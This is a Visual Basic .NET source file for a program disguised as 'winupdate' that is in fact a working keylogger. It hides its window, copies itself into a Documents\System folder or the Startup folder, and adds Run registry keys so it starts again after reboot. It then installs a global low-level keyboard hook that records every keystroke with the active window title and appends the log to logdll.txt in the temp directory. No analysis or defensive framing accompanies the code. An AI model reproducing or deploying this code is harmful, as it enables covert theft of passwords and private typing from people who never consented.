Imports System.IO

Public Class winupdate

    Private os As String = System.Environment.OSVersion.Version.Major

#Region "Load..."

    Private Sub Form1_Shown(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Shown
        Try

            Delay(3)
            Me.Hide()
            Delay(3)

            Try
                If os < 6 Then
                    Dim sourceFile As String = Application.ExecutablePath
                    Dim executable As String = My.Computer.FileSystem.SpecialDirectories.MyDocuments & "\System"
                    Try
                        If My.Computer.FileSystem.DirectoryExists(executable) Then
                        Else
                            My.Computer.FileSystem.CreateDirectory(executable)
                        End If
                        Try
                            Dim newdestinationFile As String = executable & "\" & System.IO.Path.GetFileName(sourceFile)
                            My.Computer.FileSystem.CopyFile(sourceFile, newdestinationFile, True)
                        Catch ex As Exception

                        End Try
                    Catch ex As Exception

                    End Try
                    Try

                        If My.Computer.Registry.LocalMachine.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True).GetValue("winupdate") = Nothing Then
                            My.Computer.Registry.LocalMachine.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True).SetValue("winupdate", executable & "\" & System.IO.Path.GetFileName(sourceFile))
                        End If

                        If My.Computer.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True).GetValue("winupdate") = Nothing Then
                            My.Computer.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True).SetValue("winupdate", executable & "\" & System.IO.Path.GetFileName(sourceFile))
                        End If

                    Catch ex As Exception
                    End Try

                Else
                    Try
                        Dim sourceFile As String = Application.ExecutablePath
                        Dim newdestinationFile As String = Environment.GetEnvironmentVariable("APPDATA") & "\Microsoft\Windows\Start Menu\Programs\Startup\" & System.IO.Path.GetFileName(sourceFile)
                        My.Computer.FileSystem.CopyFile(sourceFile, newdestinationFile, True)
                    Catch ex As Exception

                    End Try

                End If
            Catch ex As Exception

            End Try



            Try
                HKeyboard()
                Timer1.Start()


            Catch ex As Exception

            End Try
        Catch ex As Exception
            Application.Exit()
        End Try

    End Sub
#End Region

#Region "Func..."





    Private Sub Delay(ByVal DelayInSeconds As Integer)
        Dim ts As TimeSpan
        Dim targetTime As DateTime = DateTime.Now.AddSeconds(DelayInSeconds)
        Do
            ts = targetTime.Subtract(DateTime.Now)
            Application.DoEvents()
            System.Threading.Thread.Sleep(100)
        Loop While ts.TotalSeconds > 0
    End Sub






#End Region

#Region "KL..."
    Private Const WM_KEYUP As Integer = &H101
    Private Const WM_KEYDOWN As Short = &H100S
    Private Const WM_SYSKEYDOWN As Integer = &H104
    Private Const WM_SYSKEYUP As Integer = &H105
    Private Declare Function UnhookWindowsHookEx Lib "user32" (ByVal hHook As Integer) As Integer
    Private Declare Function SetWindowsHookEx Lib "user32" Alias "SetWindowsHookExA" (ByVal idHook As Integer, ByVal lpfn As KeyboardHookDelegate, ByVal hmod As Integer, ByVal dwThreadId As Integer) As Integer
    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Integer) As Integer
    Private Declare Function CallNextHookEx Lib "user32" (ByVal hHook As Integer, ByVal nCode As Integer, ByVal wParam As Integer, ByVal lParam As KBDLLHOOKSTRUCT) As Integer
    Private Delegate Function KeyboardHookDelegate(ByVal Code As Integer, ByVal wParam As Integer, ByRef lParam As KBDLLHOOKSTRUCT) As Integer
    Private Declare Function GetForegroundWindow Lib "user32.dll" () As Int32
    Private Declare Function GetWindowText Lib "user32.dll" Alias "GetWindowTextA" (ByVal hwnd As Int32, ByVal lpString As String, ByVal cch As Int32) As Int32

    Private Structure KBDLLHOOKSTRUCT
        Public vkCode As Integer
        Public scanCode As Integer
        Public flags As Integer
        Public time As Integer
        Public dwExtraInfo As Integer
    End Structure


    Private KeyboardHandle As IntPtr = CType(0, IntPtr)
    Private LastCheckedForegroundTitle As String = ""
    Private callback As KeyboardHookDelegate = Nothing

    Private KL As String

    Private Function GetActiveWindowTitle() As String
        Dim MyStr As String
        MyStr = New String(Chr(0), 100)
        GetWindowText(GetForegroundWindow, MyStr, 100)
        MyStr = MyStr.Substring(0, InStr(MyStr, Chr(0)) - 1)

        Return MyStr
    End Function

    Private Function Hooked() As Object
        Return KeyboardHandle <> 0
    End Function

    Private Sub HKeyboard()
        callback = New KeyboardHookDelegate(AddressOf KeyCallback)
        KeyboardHandle = SetWindowsHookEx(13, callback, System.Diagnostics.Process.GetCurrentProcess.MainModule.BaseAddress, 0)
    End Sub




    Private Function KeyCallback(ByVal Code As Integer, ByVal wParam As Integer, ByRef lParam As KBDLLHOOKSTRUCT) As Integer
        On Error Resume Next
        Dim executable As String = Application.ExecutablePath
        Dim CurrentTitle As String = GetActiveWindowTitle()
        If CurrentTitle <> LastCheckedForegroundTitle Then
            LastCheckedForegroundTitle = CurrentTitle
            KL += vbCrLf & "----------- " & CurrentTitle & " (" & Now.ToString() & ") ------------" & vbCrLf
        End If
        Dim Key As String = ""
        If wParam = WM_KEYDOWN Or wParam = WM_SYSKEYDOWN Then
           
            Select Case lParam.vkCode
                Case &H30 To &H39
                    If My.Computer.Keyboard.ShiftKeyDown Then
                        If lParam.vkCode = &H30 Then
                            Key = ")"
                        ElseIf lParam.vkCode = &H31 Then
                            Key = "!"
                        ElseIf lParam.vkCode = &H32 Then
                            Key = "@"
                        ElseIf lParam.vkCode = &H33 Then
                            Key = "#"
                        ElseIf lParam.vkCode = &H34 Then
                            Key = "$"
                        ElseIf lParam.vkCode = &H35 Then
                            Key = "%"
                        ElseIf lParam.vkCode = &H36 Then
                            Key = "^"
                        ElseIf lParam.vkCode = &H37 Then
                            Key = "&"
                        ElseIf lParam.vkCode = &H38 Then
                            Key = "*"
                        ElseIf lParam.vkCode = &H39 Then
                            Key = "("
                        ElseIf lParam.vkCode = &H30 Then
                        End If
                    Else
                        Key = ChrW(lParam.vkCode)
                    End If
                Case &H41 To &H5A
                    If My.Computer.Keyboard.CapsLock Or My.Computer.Keyboard.ShiftKeyDown Then
                        Key = ChrW(lParam.vkCode + 32)
                        Key = Key.ToUpper
                    Else
                        Key = ChrW(lParam.vkCode + 32)
                    End If

                Case &H20
                    Key = " "
                Case &HA3, &HA2
                    If KL.EndsWith("[CTRL]") Then
                    Else
                        Key = "[CTRL]"
                    End If
                Case &HA4, &HA5
                    If KL.EndsWith("[ALT]") Then
                    Else
                        Key = "[ALT]"
                    End If
                Case &HA0, &HA1
                    If KL.EndsWith("[SHFT]") Then

                    Else
                        Key = ""
                    End If
                Case &HD
                    Key = vbCrLf
                Case &H9
                    Key = "[TAB]"
                Case &H2E
                    Key = "[DEL]"
                Case &H1B
                    Key = "[ESC]"
                Case &H14
                    If My.Computer.Keyboard.CapsLock Then
                        Key = "[/CAPS]"
                    Else
                        Key = "[CAPS]"
                    End If
                Case &H60 To &H69
                    If My.Computer.Keyboard.NumLock Then
                        Key = (lParam.vkCode - 96)
                    Else
                        If lParam.vkCode = &H60 Then
                            Key = "[NumIns]"
                        ElseIf lParam.vkCode = &H61 Then
                            Key = "[NumEnd]"
                        ElseIf lParam.vkCode = &H62 Then
                            'Key = "[Num ↓]"
                        ElseIf lParam.vkCode = &H63 Then
                            Key = "[NumPD]"
                        ElseIf lParam.vkCode = &H64 Then
                            'Key = "[Num ←]"
                        ElseIf lParam.vkCode = &H65 Then
                            Key = ""
                        ElseIf lParam.vkCode = &H66 Then
                            ' Key = "[Num →]"
                        ElseIf lParam.vkCode = &H67 Then
                            Key = "[NumHome]"
                        ElseIf lParam.vkCode = &H68 Then
                            ' Key = "[Num ↑]"
                        ElseIf lParam.vkCode = &H69 Then
                            Key = "[NumPU]"
                        End If
                    End If

                Case &H70 To &H87
                    Key = "[F" & (lParam.vkCode - 111) & "]"
                Case &H27
                    ' Key = "[RArw]"
                Case &H28
                    ' Key = "[DArw]"
                Case &H25
                    '  Key = "[LArw]"
                Case &H26
                    '  Key = "[UArw]"
                Case &H8
                    KL = KL.Remove(KL.Length - 1)
                Case 190
                    If My.Computer.Keyboard.ShiftKeyDown Then
                        Key = ">"
                    Else
                        Key = "."
                    End If

                Case 189, &H6D
                    If My.Computer.Keyboard.ShiftKeyDown Then
                        Key = "_"
                    Else
                        Key = "-"
                    End If

                Case 188
                    If My.Computer.Keyboard.ShiftKeyDown Then
                        Key = "<"
                    Else
                        Key = ","
                    End If

                Case 191
                    If My.Computer.Keyboard.ShiftKeyDown Then
                        Key = "?"
                    Else
                        Key = "/"
                    End If

                Case 186
                    If My.Computer.Keyboard.ShiftKeyDown Then
                        Key = ":"
                    Else
                        Key = ";"
                    End If

                Case 222
                    If My.Computer.Keyboard.ShiftKeyDown Then
                        Key = """"
                    Else
                        Key = "'"
                    End If

                Case 220
                    If My.Computer.Keyboard.ShiftKeyDown Then
                        Key = "|"
                    Else
                        Key = "\"
                    End If

                Case 219
                    If My.Computer.Keyboard.ShiftKeyDown Then
                        Key = "{"
                    Else
                        Key = "["
                    End If

                Case 221
                    If My.Computer.Keyboard.ShiftKeyDown Then
                        Key = "}"
                    Else
                        Key = "]"
                    End If

                Case 192
                    If My.Computer.Keyboard.ShiftKeyDown Then
                        Key = "~"
                    Else
                        Key = "`"
                    End If

                Case 187
                    If My.Computer.Keyboard.ShiftKeyDown Then
                        Key = "+"
                    Else
                        Key = "="
                    End If

                Case 226
                    Key = "\"
                Case 35
                    Key = "[END]"
                Case 34
                    Key = "[PU]"
                Case 33
                    Key = "[PD]"
                Case 36
                    Key = "[Home]"
                Case 45
                    Key = "[Ins]"
                Case 145
                    Key = "[ScrLk]"
                Case 19
                    Key = "[Pause]"
                Case 144
                    Key = "[NumLock]"
                Case 111
                    Key = "/"
                Case 106
                    Key = "*"
                Case 107
                    Key = "+"
                Case 91
                    Key = "[LWin]"
                Case 92
                    Key = "[RWin]"
                Case 93
                    Key = "[MENU]"
                Case &H6E
                    If My.Computer.Keyboard.NumLock Then
                        Key = "."
                    Else
                        Key = "[NumDel]"
                    End If
                Case 12
                    Key = ""
                Case 44
                    Key = "[PrtScn]"

                Case 3
                    Key = "[Brk]"

                Case Else
                    Key = lParam.vkCode
            End Select

        ElseIf wParam = WM_KEYUP Or wParam = WM_SYSKEYUP Then
            Select Case lParam.vkCode
                Case &HA3, &HA2
                    Key = "[/CTRL]"
                Case &HA4, &HA5
                    Key = "[/ALT]"
                Case &HA0, &HA1
                    Key = ""
            End Select

        End If
        KL += Key
        Return CallNextHookEx(KeyboardHandle, Code, wParam, lParam)
    End Function


#End Region



    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        My.Computer.FileSystem.WriteAllText(Path.GetTempPath & "logdll.txt", KL, True)
    End Sub
End Class



